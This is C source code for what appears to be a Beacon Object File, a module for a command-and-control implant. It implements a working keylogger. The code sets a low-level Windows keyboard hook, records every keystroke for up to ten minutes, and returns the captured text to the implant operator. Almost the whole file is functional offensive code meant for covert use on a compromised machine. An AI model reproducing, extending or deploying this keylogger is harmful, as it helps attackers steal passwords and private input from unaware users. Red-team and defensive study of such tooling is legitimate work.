/*
 * bof-keylogger [seconds]
 *
 * In-process low-level keyboard hook (WH_KEYBOARD_LL) that records keystrokes
 * for the given number of seconds (default 30, max 600) and then prints the
 * buffer.  The hook is removed before the BOF returns, so nothing keeps
 * running after the command completes.
 *
 * The captured text is raw keys for the current session/desktop: window
 * titles and clipboard are not recorded, and secure desktops (UAC/logon) are
 * not visible to a low-level hook.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static char g_buf[16384];
static int g_len;

static void push(const char *s)
{
    while (*s && g_len < (int)sizeof(g_buf) - 2)
        g_buf[g_len++] = *s++;
}

static char shifted(char c)
{
    switch (c) {
    case '1': return '!';  case '2': return '@';  case '3': return '#';
    case '4': return '$';  case '5': return '%';  case '6': return '^';
    case '7': return '&';  case '8': return '*';  case '9': return '(';
    case '0': return ')';  case '-': return '_';  case '=': return '+';
    case '[': return '{';  case ']': return '}';  case '\\': return '|';
    case ';': return ':';  case '\'': return '"'; case ',': return '<';
    case '.': return '>';  case '/': return '?';  case '`': return '~';
    }
    if (c >= 'a' && c <= 'z') return (char)(c - 32);
    return c;
}

static LRESULT CALLBACK kb_proc(int code, WPARAM wp, LPARAM lp)
{
    if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)lp;
        DWORD vk = k->vkCode;
        int shift = (USER32$GetKeyState(VK_SHIFT) & 0x8000) != 0;
        int caps  = (USER32$GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        char one[16];

        switch (vk) {
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
        case VK_MENU: case VK_LMENU: case VK_RMENU:
        case VK_LWIN: case VK_RWIN: case VK_CAPITAL:
            return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_RETURN: push("\n"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_BACK:   push("[BKSP]"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_TAB:    push("[TAB]"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_ESCAPE: push("[ESC]"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_DELETE: push("[DEL]"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_LEFT:   push("[LEFT]"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_RIGHT:  push("[RIGHT]"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_UP:     push("[UP]"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_DOWN:   push("[DOWN]"); return USER32$CallNextHookEx(NULL, code, wp, lp);
        case VK_SPACE:  push(" "); return USER32$CallNextHookEx(NULL, code, wp, lp);
        }

        one[0] = 0;
        {
            UINT ch = USER32$MapVirtualKeyA((UINT)vk, 2 /* MAPVK_VK_TO_CHAR */);
            if (ch >= 32 && ch < 127) {
                char c = (char)(ch & 0xff);
                if (c >= 'A' && c <= 'Z') {
                    int upper = shift ^ caps;
                    c = upper ? c : (char)(c + 32);
                } else if (shift) {
                    c = shifted(c);
                }
                one[0] = c;
                one[1] = 0;
            }
        }
        if (!one[0]) {
            LONG scan = (LONG)((k->scanCode & 0xff) << 16);
            if (k->flags & LLKHF_EXTENDED) scan |= 0x01000000L;
            if (USER32$GetKeyNameTextA(scan, one, sizeof(one)) > 0) {
                push("[");
                push(one);
                push("]");
            }
        } else {
            push(one);
        }
    }
    return USER32$CallNextHookEx(NULL, code, wp, lp);
}

void go(char *args, int alen)
{
    datap parser;
    int secs = 30;
    HHOOK hook;
    ULONGLONG start;
    MSG msg;

    if (args && alen > 0) {
        BeaconDataParse(&parser, args, alen);
        {
            int v = BeaconDataInt(&parser);
            if (v > 0 && v <= 600) secs = v;
        }
    }

    g_len = 0;
    g_buf[0] = 0;

    hook = USER32$SetWindowsHookExA(WH_KEYBOARD_LL, kb_proc,
                                    KERNEL32$GetModuleHandleA(NULL), 0);
    if (!hook) {
        BeaconPrintf(CALLBACK_ERROR, "SetWindowsHookEx failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] logging keystrokes for %d s...\n", secs);
    start = KERNEL32$GetTickCount64();
    while (KERNEL32$GetTickCount64() - start < (ULONGLONG)secs * 1000ULL) {
        while (USER32$PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
            USER32$TranslateMessage(&msg);
            USER32$DispatchMessageA(&msg);
        }
        KERNEL32$Sleep(10);
    }

    USER32$UnhookWindowsHookEx(hook);

    g_buf[g_len] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "\n================ keystrokes ================\n%s\n",
                 g_buf);
    BeaconPrintf(CALLBACK_OUTPUT, "================ %d chars ================\n", g_len);
}
